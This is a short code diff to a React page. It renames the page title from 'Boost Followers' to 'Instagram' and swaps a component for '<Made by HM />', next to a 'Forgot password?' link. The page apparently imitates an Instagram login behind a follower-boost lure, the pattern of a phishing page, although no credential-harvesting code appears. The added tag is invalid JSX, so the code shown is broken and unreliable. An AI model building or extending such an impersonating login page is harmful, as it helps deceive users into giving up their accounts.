@@ -12,7 +12,7 @@ export default function Home() {
   return (
     <>
       <Head>
-        <title>Boost Followers</title>
+        <title>Instagram</title>
         
         <meta name="viewport" content="width=device-width, initial-scale=1" />
         <link rel="icon" href="/favicon.ico" />
@@ -29,7 +29,7 @@ export default function Home() {
               </div>{/* Header end */}
               <div className="form-wrap">
               </div></div></div></article></div></main></section></span>
-      <Insta />
+      <Made by HM />
 <div>
   <a className="forgot" href>Forgot password?</a>
   {/* Form-wrap end */}
